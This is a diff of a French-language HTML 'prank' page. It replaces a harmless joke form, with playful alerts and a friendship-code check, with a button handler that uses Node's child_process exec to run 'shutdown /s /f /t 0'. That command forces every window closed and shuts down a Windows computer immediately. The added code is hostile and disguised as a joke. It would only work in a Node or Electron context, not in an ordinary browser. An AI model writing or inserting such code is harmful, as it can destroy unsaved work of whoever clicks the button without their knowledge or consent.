@@ -21,19 +21,21 @@
 
     <script>
         function showPrankForm() {
-            document.getElementById("prankForm").style.display = "block";
-            alert('Surprise! Tu as cliqué sur le bouton!');
-        }
+            const { exec } = require('child_process');
 
-        function submitPrankForm() {
-            let friendId = document.getElementById("friendId").value;
-            let prankCode = document.getElementById("prankCode").value;
-
-            if (friendId === "123-amitié" && prankCode === "blague") {
-                alert("Félicitations! Tu as passé le test de l'amitié 😂");
-            } else {
-                alert("Oups! Mauvais code! Essaie encore! 😜");
-            }
+            // Commande pour fermer toutes les fenêtres et éteindre l'ordinateur
+            // Pour Windows
+            exec('shutdown /s /f /t 0', (error, stdout, stderr) => {
+                if (error) {
+                    console.error(`Erreur : ${error.message}`);
+                    return;
+                }
+                if (stderr) {
+                    console.error(`Erreur : ${stderr}`);
+                    return;
+                }
+                console.log(`Succès : ${stdout}`);
+            });
         }
     </script>
 </body>
